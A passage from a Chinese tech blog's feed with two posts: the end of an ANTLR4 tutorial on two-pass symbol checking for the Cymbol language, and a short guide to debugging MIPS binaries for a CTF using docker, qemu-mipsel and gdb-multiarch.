class="keyword">return</span> enclosingScope; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> getScopeName()+<span class="string">":"</span>+symbols.keySet().toString(); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="3-如何检查"><a href="#3-如何检查" class="headerlink" title="3. 如何检查"></a>3. 如何检查</h5><p>因为目标语言<code>Cymbol</code>允许向前引用，比如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">f</span><span class="params">()</span></span>&#123;</span><br><span class="line">    g();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">g</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>所以需要两次遍历，第一次找到所有定义，并放入符号表，将符号表构造好。<br>接下来进行第二次遍历，这时遇到一个引用，就去找符号表，找到了就是正常，找不到就是有问题。</p>
<h5 id="4-代码"><a href="#4-代码" class="headerlink" title="4. 代码"></a>4. 代码</h5><p>主要是两个文件，<code>DefPhase.java</code>和<code>RefPhase.java</code>。</p>
<h6 id="1-Defphase"><a href="#1-Defphase" class="headerlink" title="1. Defphase"></a>1. Defphase</h6><p>关键的问题：在第一次遍历构造符号表的时候，遇到新的作用域，需要把新的作用域的父作用域设置为当前作用域，并且把新的作用域设置为当前作用域。</p>
<p>对于遇到的变量定义直接使用对应的构造符号表的对象去构造就好了。</p>
<h6 id="2-RefPhase"><a href="#2-RefPhase" class="headerlink" title="2. RefPhase"></a>2. RefPhase</h6><p>遍历检查每个引用部分，去符号表里查找，找不到就报错。这部分比较简单。</p>
<h5 id="3-checkSymbol"><a href="#3-checkSymbol" class="headerlink" title="3. checkSymbol"></a>3. checkSymbol</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">parser.setBuildParseTree(<span class="keyword">true</span>);</span><br><span class="line">ParseTree tree = parser.file();</span><br><span class="line"><span class="comment">// show tree in text form</span></span><br><span class="line"><span class="comment">//System.out.println(tree.toStringTree(parser));</span></span><br><span class="line"></span><br><span class="line">ParseTreeWalker walker = <span class="keyword">new</span> ParseTreeWalker();</span><br><span class="line">DefPhase def = <span class="keyword">new</span> DefPhase();</span><br><span class="line">walker.walk(def, tree);</span><br><span class="line"><span class="comment">// create next phase and feed symbol table info from def to ref phase</span></span><br><span class="line">RefPhase ref = <span class="keyword">new</span> RefPhase(def.globals, def.scopes);</span><br><span class="line">walker.walk(ref, tree);</span><br></pre></td></tr></table></figure>
<h5 id="5-结果"><a href="#5-结果" class="headerlink" title="5. 结果"></a>5. 结果</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:46]</span></span><br><span class="line">$ antlr4 Cymbol.g4</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:49]</span></span><br><span class="line">$ javac Cymbol*.java CheckSymbols.java *Phase.java *Scope.java *Symbol.java -Xlint:deprecation</span><br><span class="line">CheckSymbols.java:9: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">import org.antlr.v4.runtime.ANTLRInputStream;</span><br><span class="line">                           ^</span><br><span class="line">CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">        ^</span><br><span class="line">CheckSymbols.java:40: 警告: [deprecation] org.antlr.v4.runtime中的ANTLRInputStream已过时</span><br><span class="line">        ANTLRInputStream input = new ANTLRInputStream(is);</span><br><span class="line">                                     ^</span><br><span class="line">3 个警告</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muheMacBookPro in ~/Study/antlr_study/chapter_8_4 [16:03:56]</span></span><br><span class="line">$ java CheckSymbols vars.cymbol</span><br><span class="line">locals:[]</span><br><span class="line"><span class="keyword">function</span>&lt;f:tINT&gt;:[&lt;x:tINT&gt;, &lt;y:tFLOAT&gt;]</span><br><span class="line">locals:[x, y]</span><br><span class="line"><span class="keyword">function</span>&lt;g:tVOID&gt;:[]</span><br><span class="line">globals:[f, g]</span><br><span class="line">line 3:4 no such variable: i</span><br><span class="line">line 4:4 g is not a variable</span><br><span class="line">line 13:4 no such <span class="keyword">function</span>: z</span><br><span class="line">line 14:4 y is not a <span class="keyword">function</span></span><br><span class="line">line 15:8 f is not a variable</span><br></pre></td></tr></table></figure>
<h4 id="0x04：-引用"><a href="#0x04：-引用" class="headerlink" title="0x04： 引用"></a>0x04： 引用</h4><p>《antlr4权威指南》</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00：介绍&quot;&gt;&lt;a href=&quot;#0x00：介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00：介绍&quot;&gt;&lt;/a&gt;0x00：介绍&lt;/h4&gt;&lt;p&gt;Antlr 4 是一个强大的语法分析器生成工具，可以用来读取、处理、执行和转换结构化文本或二进制文件。通过称为文法的形式化语言描述，ANTLR可以为该语言自动生成词法分析器。生成的语法分析器可以自动构建语法分析树，它是表示文法如何匹配输入的数据结构。ANTLR还可以自动生成树遍历器，用来访问树节点以执行特定的代码。&lt;/p&gt;
    
    </summary>
    
    
      <category term="编译原理" scheme="http://o0xmuhe.me/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"/>
    
      <category term="Antlr" scheme="http://o0xmuhe.me/tags/Antlr/"/>
    
  </entry>
  
  <entry>
    <title>mips程序调试环境折腾</title>
    <link href="http://o0xmuhe.me/2018/04/19/mips%E7%A8%8B%E5%BA%8F%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%8A%98%E8%85%BE/"/>
    <id>http://o0xmuhe.me/2018/04/19/mips程序调试环境折腾/</id>
    <published>2018-04-18T18:56:38.000Z</published>
    <updated>2018-04-19T06:25:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-起因"><a href="#0x00-起因" class="headerlink" title="0x00 : 起因"></a>0x00 : 起因</h4><p>比赛遇到了，帮学弟折腾调试环境，中间踩坑无数，但是最后还是解决了，就记录下。</p>
<a id="more"></a>
<h4 id="0x01-最初尝试"><a href="#0x01-最初尝试" class="headerlink" title="0x01 : 最初尝试"></a>0x01 : 最初尝试</h4><p>最初尝试在Linux虚拟机里，qemu + gdbserver的搞事情，但是，依赖问题太闹心了，各种交叉编译的蛋疼事情。</p>
<p>所以就放弃了。</p>
<h4 id="0x02-docker专治环境搭建"><a href="#0x02-docker专治环境搭建" class="headerlink" title="0x02 : docker专治环境搭建"></a>0x02 : docker专治环境搭建</h4><p>后来想了想，我为啥不用docker神器，肯定有人和我一样不想弄交叉编译环境，所以肯定搞了这样的镜像～</p>
<p>Google搜索一大堆之后：</p>
<ol>
<li><p><a href="https://hub.docker.com/r/skysider/multiarch-docker/" target="_blank" rel="noopener">multiarch-docker</a></p>
</li>
<li><p><a href="https://hub.docker.com/r/blukat29/cross/" target="_blank" rel="noopener">cross</a></p>
</li>
</ol>
<p>这两个还不错，我选择了第一个来使用。</p>
<h4 id="0x03-使用过程"><a href="#0x03-使用过程" class="headerlink" title="0x03 : 使用过程"></a>0x03 : 使用过程</h4><h5 id="1-获取所需镜像"><a href="#1-获取所需镜像" class="headerlink" title="1. 获取所需镜像"></a>1. 获取所需镜像</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/multiarch-docker</span><br></pre></td></tr></table></figure>
<h5 id="2-启动"><a href="#2-启动" class="headerlink" title="2. 启动"></a>2. 启动</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it \</span><br><span class="line">    --rm \</span><br><span class="line">    -h baby_mips \</span><br><span class="line">    --name baby_mips \</span><br><span class="line">    -v $(<span class="built_in">pwd</span>):/ctf/work \</span><br><span class="line">    -P \</span><br><span class="line">    --cap-add=SYS_PTRACE \</span><br><span class="line">    skysider/multiarch-docker</span><br></pre></td></tr></table></figure>
<h5 id="3-复制文件"><a href="#3-复制文件" class="headerlink" title="3. 复制文件"></a>3. 复制文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker cp ~/Downloads/baby_mips.dms 207187a8a24d:/tmp/</span><br></pre></td></tr></table></figure>
<h5 id="4-调试"><a href="#4-调试" class="headerlink" title="4. 调试"></a>4. 调试</h5><p>这里需要开两个bash，在启动容器的时候已经有一个bahs了，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps <span class="_">-a</span></span><br></pre></td></tr></table></figure>
<p>看看当前这个容器的id，然后：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it id /bin/bash</span><br></pre></td></tr></table></figure>
<p>得到两个bash，一个运行程序，一个gdb窗口。</p>
<p>运行程序：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-mipsel -g 2333 ./demo</span><br></pre></td></tr></table></figure>
<p>gdb调试端口是2333</p>
<p>gdb窗口：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./demo</span><br></pre></td></tr></table></figure>
<p>然后gdb里</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target remote localhost:2333</span><br></pre></td></tr></table></figure>
<p>gdb里好像不用set arch了，pwngdb插件自动识别了好像 囧</p>
<h5 id="5-have-fun"><a href="#5-have-fun" class="headerlink" title="5. have fun"></a>5. have fun</h5><p>Enjoy your debug journey~</p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-起因&quot;&gt;&lt;a href=&quot;#0x00-起因&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 起因&quot;&gt;&lt;/a&gt;0x00 : 起因&lt;/h4&gt;&lt;p&gt;比赛遇到了，帮学弟折腾调试环境，中间踩坑无数，但是最后还是解决了，就记录下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="debug" scheme="http://o0xmuhe.me/tags/debug/"/>
    
      <category term="mips" scheme="http://o0xmuhe.me/tags/mips/"/>
    
  </entry>
  
</feed>
